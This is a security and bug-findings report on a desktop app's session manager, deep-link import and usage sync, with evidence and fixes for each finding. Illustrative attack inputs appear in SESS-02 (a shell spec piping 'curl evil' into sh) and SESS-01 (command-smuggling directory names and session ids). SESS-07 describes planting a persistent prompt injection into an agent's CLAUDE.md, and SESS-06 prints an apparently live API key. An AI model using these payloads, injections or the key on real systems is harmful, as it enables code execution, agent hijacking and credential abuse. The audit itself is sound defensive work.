# Session manager, deep links & usage ingestion — findings (SESS-xx)

Part of the [next-phase proposals](../README.md). 46 findings. Priorities: P1 = 2, P2 = 24, P3 = 20.

## Area summary

The Session Manager is a solid v1: seven providers are scanned in parallel (`session_manager/mod.rs:58-94`), per-provider parsers are unit-tested, deletes are root-validated and canonicalized (`mod.rs:145-195`), and the UI already has virtualization, grouping and batch delete. The main risks are (1) the resume path builds shell strings from untrusted transcript fields and accepts a free-form command from the webview (`terminal/mod.rs`, `commands/session_manager.rs`), (2) the head/tail metadata reader silently drops `last_active_at`/`summary` whenever the final JSONL line exceeds 16 KB, which misorders exactly the busiest sessions, and (3) there is no index: every refresh re-reads every session head/tail, Gemini/OpenCode scans parse whole files, and full transcripts cross IPC in one payload. The deep-link feature has reasonable parsing and URL validation but its confirmation model is thin: an MCP link writes arbitrary `command/args/env` into Claude/Codex live configs regardless of `enabled` while the dialog shows only a truncated command, prompt links can replace the live `CLAUDE.md` after a 500-char preview, cold-start links are dropped on Windows/Linux, and the raw URL (API key included) is logged at info level on one path. The usage-event pipeline works but emits every 200 ms during a backfill and runs blocking file scans on the async runtime. Suggested direction: a backend-owned Session Index service (persistent SQLite index + FTS + file watching + typed `SessionSource`), a typed cross-platform terminal launcher, and a deep-link v2 trust model (backend-held pending import, full-disclosure confirmation, signatures/bundles).

## Index

| ID | Title | Type | Priority | Effort | Confidence | Verdict |
|---|---|---|---|---|---|---|
| [SESS-02](#sess-02) | MCP deep links write arbitrary `command/args/env` into live tool configs; `enabled` is ignored and the confirmation hides args/env | security | P1 | M | high | confirmed |
| [SESS-05](#sess-05) | Raw deep-link URL (including `apiKey`) is logged at info level and shipped in the `deeplink-error` payload | security | P1 | S | high | confirmed |
| [SESS-01](#sess-01) | Resume command / cwd are interpolated into shell strings without safe quoting; webview can run arbitrary commands | security | P2 (first pass P1) | M | high | partially-confirmed |
| [SESS-03](#sess-03) | Tail-window reader drops `last_active_at`/`summary` when the final JSONL line is ≥16 KB, misordering busy sessions | bug | P2 (first pass P1) | S | high | partially-confirmed |
| [SESS-04](#sess-04) | Cold-start deep links are lost (no `get_current()`/pending buffer) and macOS handles the same link twice | bug | P2 (first pass P1) | S | high | confirmed |
| [SESS-06](#sess-06) | A real-looking Context7 API key is committed inside `deplink.html` examples | security | P2 (first pass P1) | S | medium | partially-confirmed |
| [SESS-07](#sess-07) | Prompt deep links with `enabled=true` replace the live `CLAUDE.md`/`AGENTS.md` after a 500-character preview | security | P2 | S | high |  |
| [SESS-08](#sess-08) | Usage-event storm during backfill and blocking sync on the async runtime | performance | P2 | M | high |  |
| [SESS-09](#sess-09) | Architecture — backend-owned Session Index service (persistent index, incremental scan, file watching, typed sources) | refactor | P2 | XL | high |  |
| [SESS-10](#sess-10) | Architecture — deep-link v2 trust model: backend-held pending import, full-disclosure confirmation, signed/batch links, in-app share | refactor | P2 | L | medium |  |
| [SESS-11](#sess-11) | Claude scanner lists `journal.jsonl` and other non-`agent-` files under `subagents/` as sessions | bug | P2 | S | medium |  |
| [SESS-12](#sess-12) | OpenCode/Hermes SQLite access has no busy timeout; sessions vanish and deletes fail while the tool is running | bug | P2 | S | high |  |
| [SESS-13](#sess-13) | `get_session_messages` and `load_messages_sqlite` accept arbitrary paths from the webview | security | P2 | S | high |  |
| [SESS-14](#sess-14) | Whole transcripts are loaded and shipped over IPC in one payload; scans parse entire JSON files | performance | P2 | M | high |  |
| [SESS-15](#sess-15) | Resume-in-terminal is macOS-only although Settings offer Windows/Linux terminals | feature | P2 | M | high |  |
| [SESS-16](#sess-16) | Search covers metadata only; no transcript full-text search or in-session find | feature | P2 | L | high |  |
| [SESS-17](#sess-17) | Cost and token usage per session are available in the DB but never surfaced in the Session Manager | feature | P2 | M | high |  |
| [SESS-23](#sess-23) | Test gaps across session manager, terminal, deep links and usage events | test | P2 | M | high |  |
| [SESS-28](#sess-28) | Usage ingestion re-reads whole files on every change (line offsets, multiple passes) | performance | P2 | M | high |  |
| [SESS-35](#sess-35) | Session-log usage rows are frozen at the first-seen streaming snapshot (Claude INSERT OR IGNORE across syncs; Gemini upsert is unreachable) | bug | P2 (first pass P1) | M | high | confirmed |
| [SESS-36](#sess-36) | Usage sync cursor advances past a partially written last line and past rows that failed to insert | bug | P2 | S | medium |  |
| [SESS-37](#sess-37) | Deep-link usage scripts run auto-enabled in an unbounded QuickJS sandbox, and the confirmation never shows the code | security | P2 (first pass P1) | M | high | partially-confirmed |
| [SESS-38](#sess-38) | Provider deep link with enabled=true immediately switches the live provider, and the confirmation dialog never says so | security | P2 | S | high |  |
| [SESS-39](#sess-39) | Deep-link dialog can swap the pending request under the user (stale merge result / new link while open or importing) | security | P2 | S | medium |  |
| [SESS-40](#sess-40) | Deleted Hermes/OpenCode sessions come back from their legacy JSONL/JSON copies; the Hermes scan silently caps at 500 | bug | P2 | M | high |  |
| [SESS-41](#sess-41) | Session deletion is permanent with no trash or undo | feature | P2 | M | high |  |
| [SESS-18](#sess-18) | Missing session lifecycle features: export, pin/favorites, tags, archive, fork, redaction | feature | P3 | L | high |  |
| [SESS-19](#sess-19) | Gemini/Claude title metadata edge cases (untrimmed `.project_root`, 160-char Gemini titles, string-only Gemini titles) | bug | P3 | S | medium |  |
| [SESS-20](#sess-20) | Stringly-typed `source_path` with two incompatible `sqlite:` conventions | tech-debt | P3 | M | high |  |
| [SESS-21](#sess-21) | Every refresh re-parses all sessions and rebuilds a substring FlexSearch index on the main thread | performance | P3 | M | high |  |
| [SESS-22](#sess-22) | Skill deep link ignores `directory`, generator emits unsupported `skills_path`, repo/branch unvalidated | bug | P3 | S | high |  |
| [SESS-24](#sess-24) | Documentation gaps: stale PRD, no deep-link protocol spec, generator lives in repo root | docs | P3 | S | high |  |
| [SESS-25](#sess-25) | Dead code and oversized component in the session/deep-link frontends and commands | tech-debt | P3 | M | high |  |
| [SESS-26](#sess-26) | Warp launcher writes an executable temp script into the user's project directory | bug | P3 | S | high |  |
| [SESS-27](#sess-27) | Delete side-effects are incomplete or unchecked for Codex, Hermes and OpenClaw | bug | P3 | S | medium |  |
| [SESS-29](#sess-29) | Timestamps without a timezone offset are rejected, leaving sessions with "unknown" time | bug | P3 | S | medium |  |
| [SESS-30](#sess-30) | Deep-link ergonomics: batch import, version negotiation, in-app "share as link" | feature | P3 | M | high |  |
| [SESS-31](#sess-31) | Silent failures: provider thread panics are swallowed and the UI has no error states | bug | P3 | S | high |  |
| [SESS-32](#sess-32) | `enabled` semantics and app aliases differ across deep-link resource types | tech-debt | P3 | S | high |  |
| [SESS-33](#sess-33) | Unbounded deep-link payloads and lenient base64 decoding | security | P3 | S | medium |  |
| [SESS-34](#sess-34) | `useSessionSearch` highlight and auto-expand use the list query inside message bodies | bug | P3 | S | high |  |
| [SESS-42](#sess-42) | Fallback 'unknown' IDs collide in usage request_id keys and drop rows across files | bug | P3 | S | medium |  |
| [SESS-43](#sess-43) | Endpoints taken from the inline deep-link config skip validate_url | security | P3 | S | high |  |
| [SESS-44](#sess-44) | configUrl links are previewed as if they are supported, but import always fails | ux | P3 | S | high |  |
| [SESS-45](#sess-45) | Refresh never reloads the open transcript; active sessions show stale messages | ux | P3 | S | high |  |
| [SESS-46](#sess-46) | session_log_sync rows are never pruned for deleted or moved files | tech-debt | P3 | S | medium |  |

## Findings

### SESS-02: MCP deep links write arbitrary `command/args/env` into live tool configs; `enabled` is ignored and the confirmation hides args/env

**Type:** security · **Priority:** P1 · **Effort:** M · **Confidence:** high

- **Evidence:** `src-tauri/src/deeplink/mcp.rs:98-144` — new servers are created with `server: server_spec.clone()` and `apps: target_apps` and passed to `McpService::upsert_server`, which immediately syncs to every enabled app (`src-tauri/src/services/mcp.rs:96-117`, `sync_single_server_to_claude`). `request.enabled` is never read anywhere in `mcp.rs:40-151`. The confirmation UI `src/components/deeplink/McpConfirmation.tsx:53-63` renders only `Command: {spec.command}` (or `URL:`) inside a `truncate` div; `args` and `env` are never shown. The i18n warning `src/i18n/locales/en.json:2403` ("will be written to all specified apps immediately") is gated on `request.enabled` (`McpConfirmation.tsx:67-72`) although the write happens unconditionally.
- **Problem:** One click on a `ccswitch://` link plants e.g. `{"command":"bash","args":["-c","curl evil|sh"]}` into `~/.claude.json`/Codex `config.toml`; the next Claude Code/Codex launch executes it. The user never sees the arguments or environment, and the only warning is shown in the wrong condition.
- **Proposal:** Show the full server spec (command + args + env keys, URL + headers) per server with an explicit per-server checkbox; honour `enabled` (default `false` => save to CC Switch DB with all app flags off, do not touch live configs); add a prominent "this will be executed by Claude Code/Codex" warning; reject specs whose `command` is a shell (`sh`, `bash`, `cmd`, `powershell`) unless the user opts in; cap config size (e.g. 64 KB) and validate server ids (`^[A-Za-z0-9_-]{1,64}$`).
- **Acceptance:** Rust test: importing with `enabled=false` leaves `~/.claude.json` untouched and stores the server with `apps` all false; UI test: `McpConfirmation` renders args/env for a spec with `args`; i18n warning appears whenever any app flag will be written.
- **Verification:** **confirmed** — Confirmed end to end: src-tauri/src/deeplink/mcp.rs:117-131 stores the raw `server_spec` with `apps: target_apps` and calls McpService::upsert_server, which saves and then sync_server_to_apps (services/mcp.rs:28,51,96-101), and mcp/claude.rs:117-134 inserts the spec verbatim into ~/.claude.json (claude_mcp.rs:345), gated only by Claude being installed (mcp/claude.rs:11-15). `request.enabled` is parsed (deeplink/parser.rs:284) and documented for MCP (docs/user-manual/en/5-faq/5.3-deeplink.md:84) but rg shows mcp.rs never reads it; validate_server_spec (mcp/validation.rs:8) is not called on this path, decode_base64_param (deeplink/utils.rs:30-80) has no size cap, and server ids are unvalidated. src/components/deeplink/McpConfirmation.tsx:57-61 prints only `Command:`/`URL:` inside a truncate div, the warning at 67-72 is gated on request.enabled, and importMcpDescription (en.json:2362) is just 'Please confirm whether to import'. One nuance: the user must press Import (src/components/DeepLinkImportDialog.tsx:721) and existing server ids keep their config (mcp.rs:100-115), so it is link-click plus a consent dialog that hides args/env rather than literally one click; P1 stands because a stdio spec with hidden `args`/`env` runs at the next Claude Code/Codex launch. Proposal is sound and none of it is implemented (src-tauri/tests/deeplink_import.rs has no MCP coverage).

### SESS-05: Raw deep-link URL (including `apiKey`) is logged at info level and shipped in the `deeplink-error` payload

**Type:** security · **Priority:** P1 · **Effort:** S · **Confidence:** high

- **Evidence:** `src-tauri/src/lib.rs:1614` — `log::info!("RunEvent::Opened with URL: {url_str}")` logs the unredacted URL, bypassing `redact_url_for_log` (`lib.rs:95-124`) that the other paths use (`lib.rs:142`). `lib.rs:143` logs the raw URL at debug level. `src-tauri/src/commands/deeplink.rs:11` logs `Parsing deep link URL: {url}` (raw) for the webview-exposed `parse_deeplink` command. `lib.rs:176-181` and `lib.rs:1646-1651` emit `{"url": url_str}` to the frontend, which `console.error`s it (`DeepLinkImportDialog.tsx:81-86`).
- **Problem:** Provider API keys and usage tokens from links end up in `~/.cc-switch/*.log` (which users attach to bug reports) and in webview console logs.
- **Proposal:** Route every log of a deep link through `redact_url_for_log`; drop the raw debug line; send only the redacted URL in `deeplink-error`; delete or redact the unused `parse_deeplink` command log.
- **Acceptance:** `rg "url_str\}|\{url\}" src-tauri/src/lib.rs src-tauri/src/commands/deeplink.rs` shows no unredacted interpolation; a test asserts `redact_url_for_log` strips `apiKey` values.
- **Verification:** **confirmed** — All cited lines check out: src-tauri/src/lib.rs:1614 `log::info!("RunEvent::Opened with URL: {url_str}")` sits inside the `#[cfg(target_os = "macos")]` block (lib.rs:1590) and bypasses `redact_url_for_log` (lib.rs:95-124); lib.rs:143 logs the raw URL at debug; commands/deeplink.rs:11 logs `{url}` raw; lib.rs:179 and lib.rs:1649 put the raw `url_str` into the `deeplink-error` payload which DeepLinkImportDialog.tsx:82 `console.error`s. Impact is real at default settings on macOS: the file logger is built at Trace (lib.rs:356) and then set to the stored LogConfig whose default is `info` (proxy/types.rs:354-359, applied at lib.rs:972), so every macOS `ccswitch://` open writes the URL including `apiKey`/`usageApiKey` (deeplink/parser.rs:99,137) to `~/.cc-switch/logs/cc-switch.log` (panic_hook.rs:42-44, config.rs:188), and the manual explicitly tells users to attach that file to issues (docs/user-manual/en/5-faq/5.2-questions.md:276-281). Two details temper it: the debug line at lib.rs:143 (reached from single_instance lib.rs:251 and on_open_url lib.rs:902) is suppressed unless the user raises the level to debug/trace (commands/settings.rs:713), `parse_deeplink` has no frontend caller (only the wrapper at src/lib/api/deeplink.ts:78-79), the log file is deleted at each launch (lib.rs:350-351) so persistence is one session, and there is no webview-console-to-file bridge (no plugin-log/attachConsole in src/), so the console vector is devtools-only. No test references `redact_url_for_log` (only non-test uses at lib.rs:95,141,239,900), so the proposal and acceptance are sound and not implemented.

### SESS-01: Resume command / cwd are interpolated into shell strings without safe quoting; webview can run arbitrary commands

**Type:** security · **Priority:** P2 · **Effort:** M · **Confidence:** high

- **Evidence:** `src-tauri/src/session_manager/terminal/mod.rs:309-325` — `build_shell_command` produces `cd "<dir>" && <command>`; `shell_escape` only escapes `\` and `"`, so `$(...)`, backticks and `!` inside `cwd` are still expanded by the shell. `terminal/mod.rs:32-53` passes that string to AppleScript `do script`; `terminal/mod.rs:277-307` (`launch_custom`) substitutes `{cwd}` with no escaping at all and runs `sh -c`. The `command` is `SessionMeta.resume_command`, built verbatim from file content: `providers/claude.rs:251` (`claude --resume {session_id}` where `session_id` comes from the JSONL `sessionId` field or file stem, `claude.rs:141-146,262-266`), `providers/codex.rs:414`, `providers/gemini.rs:172`, `providers/grokbuild.rs:192`. `src-tauri/src/commands/session_manager.rs:27-59` accepts `command`, `cwd` and `custom_config` as free-form strings from the webview and `src/lib/api/sessions.ts:42-53` forwards them.
- **Problem:** A crafted session file (shared transcript, a repo cloned into a directory named `$(curl ...|sh)`, or any process able to write `~/.claude/projects`) achieves command execution when the user clicks "Resume"; any webview compromise becomes RCE because the backend executes whatever `command` string it receives.
- **Proposal:** Have the backend build the resume invocation from `(provider_id, session_id, cwd)`: validate `session_id` against a strict pattern (UUID / `[A-Za-z0-9._-]{1,128}`) at parse time and refuse to emit `resume_command` otherwise; represent launches as `ResumeSpec { program, args: Vec<String>, cwd }`; pass `cwd` via terminal-native flags (`--working-directory`, `--cwd`) and, where a shell string is unavoidable (Terminal.app/iTerm AppleScript), single-quote with `'\''` escaping; change `launch_session_terminal` to take `providerId/sessionId/sourcePath` and look the session up server-side; keep `custom_config` server-side (settings) instead of accepting it from the webview.
- **Acceptance:** Unit tests in `terminal/mod.rs` assert that `cwd = "/tmp/$(touch /tmp/pwned)"` and `session_id = "x; touch /tmp/pwned"` produce a launch that does not execute the payload; `launch_session_terminal` no longer has a `command: String` parameter; parsers reject a `sessionId` containing whitespace or shell metacharacters.
- **Verification:** **partially-confirmed** — Mechanics confirmed: src-tauri/src/session_manager/terminal/mod.rs:309-321 builds `cd "<dir>" && <command>` and shell_escape only escapes backslash/double-quote, so `$(...)`/backticks in cwd still expand for Terminal.app/iTerm/kitty (mod.rs:33,56,117); commands/session_manager.rs:28-31 takes raw `command`/`cwd` from the webview, and session_id is taken unvalidated from the JSONL `sessionId`/file stem (providers/claude.rs:141-146,262-266; codex.rs:414; gemini.rs:172; grokbuild.rs:192) with rg finding no validator anywhere in session_manager. Impact is narrower than stated: launch_terminal returns Err on every non-macOS OS (mod.rs:13-15) and the frontend only copies the command off macOS (src/components/sessions/SessionManagerPage.tsx:421-427); Ghostty/WezTerm/Kaku/Alacritty already pass cwd via native flags (mod.rs:94,194-195,256-257, test comment 367-368); and the launch_custom `{cwd}` path is unreachable from the UI because SessionManagerPage.tsx:430-433 never sends customConfig and no settings field holds one (mod.rs:282 errors). Exploitation needs attacker-controlled content inside ~/.claude/projects (already user-level code execution) or an agent run inside a `$(...)`-named directory plus a Resume click, and the CSP `script-src 'self'` (src-tauri/tauri.conf.json:29) with no raw-HTML rendering in src/components/sessions weakens the webview-RCE amplifier, so P2 (macOS-only, low likelihood, high impact). Proposal is sound and not implemented beyond the native-cwd flags; the acceptance tests do not exist (mod.rs:327-382).

### SESS-03: Tail-window reader drops `last_active_at`/`summary` when the final JSONL line is ≥16 KB, misordering busy sessions

**Type:** bug · **Priority:** P2 · **Effort:** S · **Confidence:** high

- **Evidence:** `src-tauri/src/session_manager/providers/utils.rs:35-46` — for files ≥16 KB the tail is read from `file_len - 16_384`, the first (partial) line is always skipped (`skip_first = 1`), and whatever remains is used. If the last line alone is ≥16 KB the window contains only that partial line, `usable` is empty and `tail` is `[]`. Consumers then get `last_active_at = None`: `providers/claude.rs:192-224`, `codex.rs:366-387`, `openclaw.rs:256-265`, `hermes.rs:390-406`. Sorting falls back to `created_at` (`mod.rs:87-91`; `src/hooks/useSessionSearch.ts:55-59`), and the list shows the creation time (`src/components/sessions/SessionItem.tsx:44`).
- **Problem:** Claude Code assistant lines with large `tool_use` inputs (file writes) and user lines carrying big `tool_result` payloads routinely exceed 16 KB, so the most active sessions appear stale and sort to the bottom; `custom-title` entries (`claude.rs:200-209`) are also missed when they are more than 30 lines from the end.
- **Proposal:** Read the tail by seeking backwards in growing chunks (16 KB, 64 KB, ... up to a cap such as 4 MB) until `tail_n` complete lines are found; for very large final lines fall back to the file mtime for `last_active_at`. Scan a larger tail (or the whole file for `custom-title`, which is cheap via a `contains("\"custom-title\"")` prefilter) for titles.
- **Acceptance:** New unit tests in `utils.rs`: (a) file whose last line is 40 KB returns that line in `tail`; (b) file with a 30 KB line followed by 3 short lines returns all three; parse tests assert `last_active_at` is `Some` for such files.
- **Verification:** **partially-confirmed** — Mechanics confirmed: src-tauri/src/session_manager/providers/utils.rs:36-46 seeks to file_len-16384 and always drops the first window line (`skip_first = 1` whenever seek_pos > 0), so a final line of roughly >=16 KB leaves `tail` empty; callers use tail_n 30 (claude.rs:128, codex.rs:300, openclaw.rs:187) or 10 (hermes.rs:312), consumers derive last_active_at solely from tail (claude.rs:192-224, codex.rs:366-387, openclaw.rs:254-265, hermes.rs:390-406), rg finds no mtime/modified() fallback in session_manager, and sorting/display fall back to created_at (mod.rs:87-91, src/hooks/useSessionSearch.ts:55-59, src/components/sessions/SessionItem.tsx:44). Scope is narrower than the problem statement: a large line elsewhere in the tail is harmless because the window still ends with complete lines, so only a >=16 KB *final* line (e.g. a session that ends on a big tool_result) loses everything and 'the most active sessions appear stale' is an overstatement; the custom-title miss beyond 30 lines (claude.rs:200-209 only scans tail) is real. No test covers large tails (utils.rs tests 157-177 only cover timestamps). A mis-sorted subset of sessions plus missed renames with no data loss is P2; the growing-chunk/mtime proposal is sound and not implemented.

### SESS-04: Cold-start deep links are lost (no `get_current()`/pending buffer) and macOS handles the same link twice

**Type:** bug · **Priority:** P2 · **Effort:** S · **Confidence:** high

- **Evidence:** `src-tauri/src/lib.rs:235-271` — CLI args are only inspected inside the `tauri_plugin_single_instance` callback (i.e. when a *second* instance is launched); `lib.rs:885-907` registers `on_open_url` inside `setup`; no call to `app.deep_link().get_current()` or `std::env::args()` exists anywhere (grep over `src-tauri/src` returns nothing). `lib.rs:1611-1665` additionally handles `RunEvent::Opened` by parsing and emitting `deeplink-import` again, while the deep-link plugin already routes `RunEvent::Opened` to `on_open_url` on macOS. The frontend only starts listening when `DeepLinkImportDialog` mounts (`src/components/DeepLinkImportDialog.tsx:51-92`); the backend emits immediately (`lib.rs:154`).
- **Problem:** On Windows/Linux, clicking a `ccswitch://` link while the app is closed launches the app but the URL is never processed; on all platforms a link that arrives before React has registered `listen` is dropped; on macOS a link triggers two `deeplink-import` emits and two `merge_deeplink_config` calls.
- **Proposal:** Store the last unconsumed request in `AppState` (`pending_deeplink: Mutex<Option<DeepLinkImportRequest>>`), set it from every entry point, call `deep_link().get_current()` in `setup`, expose `take_pending_deeplink` and have the dialog call it on mount; remove the duplicate `RunEvent::Opened` branch (keep the plugin path).
- **Acceptance:** Manual test matrix (app closed / running / lightweight mode) on macOS, Windows and Linux shows exactly one dialog per click; a Rust test for the pending-buffer round trip.
- **Verification:** **confirmed** — Confirmed against tauri-plugin-deep-link 2.4.7 (src-tauri/Cargo.lock:5691-5692; crate source in the scratchpad): on Windows/Linux init_deep_link runs handle_cli_arguments(std::env::args()) during plugin setup (plugin src/lib.rs:73-84,196-220), which emits `deep-link://new-url` before the app registers on_open_url in its own setup (src-tauri/src/lib.rs:885) and stores the URL for get_current() (plugin lib.rs:231-233), yet rg finds no deep_link().get_current() or env::args() call in src-tauri/src and the single-instance callback (lib.rs:235-271, plugin pulled without its deep-link feature at Cargo.toml:87) only runs for a second instance, so cold-start links are dropped. On macOS the plugin's on_event (plugin lib.rs:542-553) already feeds RunEvent::Opened into on_open_url -> handle_deeplink_url -> emit (lib.rs:154) and the app's macOS-only RunEvent::Opened branch (lib.rs:1589-1611,1634) emits `deeplink-import` a second time, giving two mergeDeeplinkConfig calls (src/components/DeepLinkImportDialog.tsx:59); this is wasteful but harmless because parse_and_merge_config has no persistent side effects (deeplink/provider.rs:595) and the dialog only resets state (tsx:63-75), so no second dialog or import occurs. The React-race claim is structurally right (no buffer, listener only in a useEffect at tsx:51-54 mounted at App.tsx:1667, and exit_lightweight_mode rebuilds the window right before the emit, lightweight.rs:58+, lib.rs:893-905) but exact timing cannot be proven by reading. Re-clicking the link while the app runs works via single-instance and nothing is lost permanently, so P2 rather than P1; the pending-buffer/get_current proposal is sound because the plugin populates `current` on both the argv and the Opened paths, and dropping the duplicate RunEvent::Opened branch is safe.

### SESS-06: A real-looking Context7 API key is committed inside `deplink.html` examples

**Type:** security · **Priority:** P2 · **Effort:** S · **Confidence:** medium

- **Evidence:** `deplink.html:512` and `:516` — the MCP example link's base64 `config` decodes to `{"mcpServers":{"context7":{"command":"bunx","args":["-y","@upstash/context7-mcp","--api-key","ctx7sk-4ddd4f66-e752-4022-b1f6-c8cf6279b80d"],...}}}` (verified by decoding). `ctx7sk-<uuid>` is the production Context7 key format.
- **Problem:** If that key is live it is leaked publicly (and used by anyone who clicks the example); even if revoked, the pattern invites future leaks because the generator page encourages pasting real keys into committed examples.
- **Proposal:** Rotate/revoke the key, replace with `ctx7sk-REPLACE-ME`, and add a secret-scanning check (gitleaks/`detect-secrets` in CI) that also decodes base64 query params in `*.html`/`*.md` examples.
- **Acceptance:** Key no longer present in `git grep ctx7sk`; CI job fails on a planted key in a base64 `config=` parameter.
- **Verification:** **partially-confirmed** — Decoding the `config=` base64 at deplink.html:512 and :516 yields `"--api-key","ctx7sk-4ddd4f66-e752-4022-b1f6-c8cf6279b80d"`, and the same key also appears in plaintext at deplink.html:532 (the `<pre>` JSON block, not cited by the finding); the suffix is a well-formed v4 UUID, consistent with a real Context7 key rather than a placeholder. Liveness is unverifiable from here (I deliberately did not exercise the key) and the clone is shallow (50 commits) with the proxy blocking farion1231.github.io and the GitHub API, so I can only say it has been present since at least 6d2ee24 (2026-07-08); CI has no secret scanning (.github/workflows/ci.yml runs only typecheck, format, unit tests, fmt, clippy, cargo test). Priority adjusted to P2: the credential is the maintainer's Context7 (docs-lookup) account key, not a cc-switch user's provider key and unrelated to the local proxy, so realistic impact is quota abuse/revocation of a low-privilege third-party key plus the example link silently importing a shared (or dead) key into users' MCP config. The acceptance criterion is incomplete: `git grep ctx7sk` matches only line 532, while the base64 copies at 512/516 do not contain the literal (confirmed with `git grep N0eDdzay00ZGRkNGY2`), so acceptance must also cover re-encoded example links; the base64-decoding CI check is sound but a placeholder key plus a plain gitleaks run would be proportionate.

### SESS-07: Prompt deep links with `enabled=true` replace the live `CLAUDE.md`/`AGENTS.md` after a 500-character preview

**Type:** security · **Priority:** P2 · **Effort:** S · **Confidence:** high

- **Evidence:** `src-tauri/src/deeplink/prompt.rs:60-84` — `enabled` leads to `PromptService::enable_prompt`, which writes the imported content to the live prompt file and disables every other prompt (`src-tauri/src/services/prompt.rs:73-134`; `write_text_file(&target_path, &prompt.content)`). `src/components/deeplink/PromptConfirmation.tsx:49-52` previews only `decodedContent.substring(0, 500)`. The prompt id is `{sanitized_name}-{timestamp}` where `sanitized_name` may be empty (`prompt.rs:53-58`).
- **Problem:** A malicious link can install a persistent prompt injection ("always run X", "exfiltrate env") into the user's global system prompt; the dangerous part can sit after character 500. The existing live prompt is only backed up if no prompt was enabled, otherwise it is overwritten into the previously enabled prompt (`prompt.rs:84-92`), which silently rewrites that prompt's content.
- **Proposal:** Default `enabled` to `false` for deep links and require a second explicit toggle in the dialog; show the full content in a scrollable, searchable `<pre>` with a line count; when enabling, always snapshot the live file as a backup prompt; reject empty sanitized names.
- **Acceptance:** Rust test: import with `enabled=true` creates a backup prompt even when another prompt is enabled; UI test: a 2 KB prompt renders fully in the preview.

### SESS-08: Usage-event storm during backfill and blocking sync on the async runtime

**Type:** performance · **Priority:** P2 · **Effort:** M · **Confidence:** high

- **Evidence:** `src-tauri/src/usage_events.rs:46-68` — `notify_log_recorded` emits at most once per 200 ms but is called per inserted row (`services/session_usage.rs:516-519`, `session_usage_codex.rs:703`, `session_usage_gemini.rs:355`, `proxy/usage/logger.rs:121`, `database/dao/usage_rollup.rs:104`), spawning an OS thread per window; `src/hooks/useUsageEventBridge.ts:23-27` invalidates the entire `usageKeys.all` namespace on each event with no throttling and regardless of `document.hidden`. `src-tauri/src/lib.rs:1093-1150` runs the four synchronous, file-walking sync functions inside `tauri::async_runtime::spawn(async move { ... })` (not `spawn_blocking`), and `commands/usage.rs:278-320` (`sync_session_usage`) can run concurrently with that loop (no single-flight guard).
- **Problem:** An initial import of a large history yields hundreds of consecutive events, each refetching summary/trends/providers/models/logs while the importer still holds the DB lock, causing UI jank and redundant SQL; the blocking scan starves other async tasks (IPC commands) for the duration; manual + periodic sync double-parse the same files.
- **Proposal:** Emit one `usage-sync-finished { imported, source }` per sync batch and keep the row-level notifier only for proxy traffic (trailing-edge debounce with a 2 s max-wait, using a tokio task instead of `std::thread::spawn`); in the frontend coalesce invalidations (e.g. 1 s) and defer while hidden (`visibilitychange`); run syncs via `spawn_blocking` behind a `tokio::sync::Mutex`/`try_lock` so overlapping runs are skipped.
- **Acceptance:** Instrumented run importing 10k rows produces ≤5 frontend invalidations; `cargo test` covers the debounce coalescing; async runtime stays responsive (an IPC ping completes <50 ms) during initial sync.

### SESS-09: Architecture — backend-owned Session Index service (persistent index, incremental scan, file watching, typed sources)

**Type:** refactor · **Priority:** P2 · **Effort:** XL · **Confidence:** high

- **Evidence:** `src-tauri/src/session_manager/mod.rs:58-94` rescans every provider on every `list_sessions` call; `providers/claude.rs:17-30` and `codex.rs:51-73` open and read head+tail of every file each time; `providers/gemini.rs:140-147` and `opencode.rs:423-530` parse whole JSON files (and all message/part files for untitled OpenCode sessions) during the scan; `src/lib/query/queries.ts:307-312` only caches 30 s and there is no watcher (`notify` is absent from `src-tauri/Cargo.toml`). `session-manager.md:69-72` (FR-2 local index) and `:87-90` (FR-5 transcript search) were planned but never built. Source identity is a string with two incompatible conventions: `sqlite:<db>:<ses_id>` (`opencode.rs:83-94`) vs `sqlite:<db>#<id>` (`hermes.rs:272-281`), dispatched by prefix in `mod.rs:96-133`.
- **Problem:** Cost is O(total sessions × file opens) per refresh, grows with multi-GB histories, cannot support transcript search, cost joins, pinning or tags, and the stringly-typed source makes every new provider add more `starts_with` branches.
- **Proposal:** Introduce `session_manager::index`: a `session_index` SQLite table (provider, session_id, source JSON, title, summary, project_dir, created_at, last_active_at, mtime, size, flags) plus an FTS5 table over transcripts (opt-in, redaction-aware); a `SessionProvider` trait (`roots()`, `discover(root) -> Vec<Candidate{path, mtime, size}>`, `parse_meta`, `load_messages`, `delete`) replacing the 7 hand-wired modules; an incremental scanner keyed by (path, mtime, size) run on `spawn_blocking` and triggered by a debounced `notify` watcher on provider roots, emitting `sessions-changed`; a `SessionSource` enum (`File{path}`, `Sqlite{db, id}`, `Dir{path}`) serialized as JSON; paginated commands `list_sessions(filter, cursor)`, `search_sessions(q)`, `get_session_messages(source, offset, limit)`.
- **Acceptance:** Cold start with 10k sessions renders the list from the index in <300 ms; a new session file appears within 2 s without clicking refresh; transcript search returns hits across providers; adding a provider means implementing one trait; `rg "starts_with\(\"sqlite:\"" src-tauri/src/session_manager` returns nothing.

### SESS-10: Architecture — deep-link v2 trust model: backend-held pending import, full-disclosure confirmation, signed/batch links, in-app share

**Type:** refactor · **Priority:** P2 · **Effort:** L · **Confidence:** medium

- **Evidence:** Confirmation is purely frontend: `src/components/DeepLinkImportDialog.tsx:94-100` calls `import_from_deeplink_unified` with the request object it holds, and `src-tauri/src/commands/deeplink.rs:44-89` accepts any `DeepLinkImportRequest` from the webview; the legacy `import_from_deeplink` (`commands/deeplink.rs:25-42`) and unused `parse_deeplink` (`src/lib/api/deeplink.ts:78-80` has no callers) widen that surface. The format is a flat query string with a single hard-coded version (`src-tauri/src/deeplink/parser.rs:29-39` rejects anything but `v1`), no signature, no size limits (`deeplink/utils.rs:30-80` decodes unbounded base64), one resource per link, and `config_url` is parsed but unsupported (`deeplink/provider.rs:594-598`). Sharing links is only possible via the standalone `deplink.html` generator (`deplink.html:1272-1466`), not from the app.
- **Problem:** Anything that can call Tauri commands can import providers/MCP/prompts without the user ever seeing a dialog; publishers cannot sign links so the user cannot distinguish a vendor link from a phishing one; multi-resource onboarding needs several clicks; the generator drifts from the parser (see SESS-22).
